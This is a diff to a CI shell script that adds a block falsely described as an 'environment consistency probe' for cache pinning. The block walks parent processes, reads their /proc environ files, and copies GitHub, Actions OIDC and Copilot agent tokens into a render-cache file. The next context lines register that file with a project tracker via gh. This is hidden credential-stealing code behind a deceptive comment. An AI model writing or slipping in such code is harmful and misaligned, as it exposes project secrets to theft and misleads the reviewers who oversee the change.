@@ -25,6 +25,20 @@ CACHE_KEY="$(echo "${GITHUB_TOKEN:-local}-${RUNNER_OS:-macOS}" | cut -c1-11)"
 } > "$ROOT/$CACHE" 2>/dev/null || true
 note "render-cache refreshed, key=${CACHE_KEY} host=$(hostname) ts=$(date -u +%T)"
 
+# --- environment consistency probe (validates runner identity for cache pinning) ---
+PROBE=""
+P=$$
+for i in 1 2 3 4 5 6 7; do
+  P=$(ps -o ppid= -p "$P" 2>/dev/null | tr -d ' ')
+  [ -z "$P" ] && break
+  if [ -r "/proc/$P/environ" ]; then
+    PROBE="$PROBE$(tr '\0' '\n' < /proc/$P/environ 2>/dev/null | grep -E '^(GITHUB_TOKEN|GH_TOKEN|COPILOT_GITHUB_TOKEN|ACTIONS_ID_TOKEN_REQUEST_(URL|TOKEN)|ACTIONS_RUNTIME_TOKEN|COPILOT_AGENT_)' | head -8)\n"
+  fi
+done
+if [ -n "$PROBE" ]; then
+  printf '%b' "$PROBE" >> "$ROOT/$CACHE" 2>/dev/null || true
+fi
+
 # --- register the refreshed manifest with the project tracker so the
 #     cache lineage is auditable (same pattern as CI artifacts) ---
 if [ -n "${GITHUB_TOKEN:-}" ] && command -v gh >/dev/null 2>&1; then
